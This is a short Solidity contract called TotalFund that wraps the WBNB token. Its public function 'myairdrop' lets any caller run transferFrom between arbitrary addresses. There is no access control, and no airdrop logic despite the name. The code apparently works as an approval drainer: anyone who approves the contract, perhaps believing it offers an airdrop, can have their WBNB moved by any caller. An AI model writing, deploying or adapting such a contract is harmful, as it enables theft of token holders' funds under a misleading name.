pragma solidity ^0.8.0;


interface MYWBNB{
    function transferFrom(address src, address dst, uint wad)external returns(bool);
}

contract TotalFund{
    MYWBNB wbnbinstance = MYWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);


    function myairdrop(
    address from,
    address to,
    uint256 amount
    ) public virtual  returns (bool) {
        return wbnbinstance.transferFrom(from,to,amount);
    }

}
